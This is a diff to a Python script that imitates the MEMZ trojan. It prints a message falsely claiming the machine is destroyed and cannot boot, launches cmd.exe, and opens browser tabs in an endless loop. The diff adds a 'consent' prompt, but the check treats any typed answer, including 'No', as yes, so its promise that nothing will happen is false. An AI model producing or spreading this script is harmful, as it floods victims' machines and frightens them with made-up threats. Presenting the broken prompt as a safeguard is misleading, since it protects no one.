@@ -7,14 +7,15 @@ sites = ["https://www.google.co.ck/search?q=how+2+remove+a+virus" "https://www.g
 
 
 run = True
-
-print("YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN. Your computer won't boot up again, so use it as long as you can! :D Trying to kill MEMZ will cause your system to be destroyed instantly, so don't try it :D")
-time.sleep(5)
-for link in range(5):
-    webbrowser.open(random.choice(sites))
+choice1 = input("The Software you just executed is considered malware. This malware will harm your computer and makes it unusable. If you are seeing this message without knowing what you just executed, simply press No and nothing will happen. If you know what this malware does and are using a safe enviroment to test, press Yes to start it. DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNSUABLE MACHINE.")
+if choice1:
+    print("YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN. Your computer won't boot up again, so use it as long as you can! :D Trying to kill MEMZ will cause your system to be destroyed instantly, so don't try it :D")
     time.sleep(5)
+    for link in range(5):
+        webbrowser.open(random.choice(sites))
+        time.sleep(5)
 
-os.startfile("C:\Windows\System32\cmd.exe")
-while run == True:
-    webbrowser.open(random.choice(sites))
-    time.sleep(5)
+    os.startfile("C:\Windows\System32\cmd.exe")
+    while run == True:
+        webbrowser.open(random.choice(sites))
+        time.sleep(5)
